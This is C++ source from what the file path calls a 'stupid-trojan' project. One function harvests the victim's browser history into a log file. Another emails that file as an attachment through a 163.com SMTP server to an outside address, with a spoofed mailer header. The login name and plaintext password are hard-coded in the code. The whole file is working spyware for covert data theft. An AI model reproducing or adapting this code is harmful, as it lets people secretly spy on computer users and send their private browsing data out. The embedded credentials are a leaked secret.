
#include "util.h"

void sendemail()
{
	bool bError = false;

	try
	{
		CSmtp mail;
		mail.SetSMTPServer("smtp.163.com", 25);
		mail.SetLogin("liutobepure@163.com");
		mail.SetPassword("xiaoliu123");
		mail.SetSenderName("User");
		mail.SetSenderMail("liutobepure@163.com");
		mail.SetReplyTo("liutobepure@163.com");
		mail.SetSubject("The message");
		mail.AddRecipient("chenlz@mail.sustc.edu.cn");
		mail.SetXPriority(XPRIORITY_NORMAL);
		mail.SetXMailer("The Bat! (v3.02) Professional");
		mail.AddMsgLine("Hello,");
		mail.AddMsgLine("");
		mail.AddMsgLine("...");
		mail.AddMsgLine("How are you today?");
		mail.AddMsgLine("");
		mail.AddMsgLine("Regards");
		mail.ModMsgLine(5, "regards");
		mail.DelMsgLine(2);
		mail.AddMsgLine("User");

		//mail.AddAttachment("../test1.jpg");
		mail.AddAttachment("C:/Users/liu/Documents/Visual Studio 2015/Projects/stupid-trojan/stupid-trojan/log");
		//mail.AddAttachment("c:\\test3.txt");
		mail.Send();

	}
	catch (ECSmtp e)
	{
		std::cout << "Error: " << e.GetErrorText().c_str() << ".\n";
		bError = true;
	}
	if (!bError)
		std::cout << "Mail was send successfully.\n";
}

void getHistory()
{
	BrowsHistory browseHistory;
	browseHistory.Init();
	while (!browseHistory.m_bStatus);	//等待获取完成  
	auto data = browseHistory.GetBrowsHistory();

	wofstream outfile("log");
	for (auto it = data.begin(); it<data.end(); ++it)
	{
		wcout << it->strURL.GetString() << "  " << it->nCount << endl;
		outfile << it->strURL.GetString() << "  " << it->nCount << endl;
	}

	outfile.close();
	getchar();
}